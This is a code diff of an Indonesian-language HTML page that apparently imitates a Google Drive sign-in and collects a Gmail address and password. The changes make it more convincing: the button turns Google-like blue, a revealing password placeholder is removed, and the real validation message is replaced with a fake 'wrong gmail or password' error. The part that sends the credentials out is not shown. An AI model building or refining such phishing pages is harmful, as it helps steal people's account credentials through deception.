@@ -9,7 +9,7 @@
     h1{margin:0 0 12px}
     label{display:block;margin:12px 0 6px}
     input{width:100%;padding:10px;border:1px solid #ddd;border-radius:8px}
-    button{margin-top:16px;width:100%;padding:12px;border:0;border-radius:8px;background:#111;color:#fff;cursor:pointer}
+    button{margin-top:16px;width:100%;padding:12px;border:0;border-radius:8px;background:#002df3;color:#fff;cursor:pointer}
     .error{color:#c62828;margin-top:8px;font-size:13px;display:none}
     .notice{background:#fff7e6;border:1px solid #ffe6b3;color:#8a6100;padding:10px;border-radius:10px;margin-bottom:12px;font-size:13px}
   </style>
@@ -17,12 +17,12 @@
 <body>
   <div class="card">
     <div class="notice"> . <b> LOGIN DENGAN AKUN GOOGLE </b></div>
-    <h1>Login Drive 1</h1>
+    <h1>Login Drive </h1>
     <form id="form">
       <label>Email</label>
       <input id="email" type="email" placeholder="nama@gmail.com" required />
       <label>Password </label>
-      <input id="pass" type="password" placeholder=" harus yang bener ya" required />
+      <input id="pass" type="password" placeholder=" ..." required />
       <button type="submit">Login</button>
       <div id="err" class="error"></div>
     </form>
@@ -41,7 +41,7 @@
 
       // <-- VALIDASI SEDERHANA (PAKE endsWith)
       if (!email.endsWith('@gmail.com')) {
-        errEl.textContent = 'Email harus berakhiran @gmail.com';
+        errEl.textContent = 'gmail atau password anda salah';
         errEl.style.display = 'block';
         return;
       }
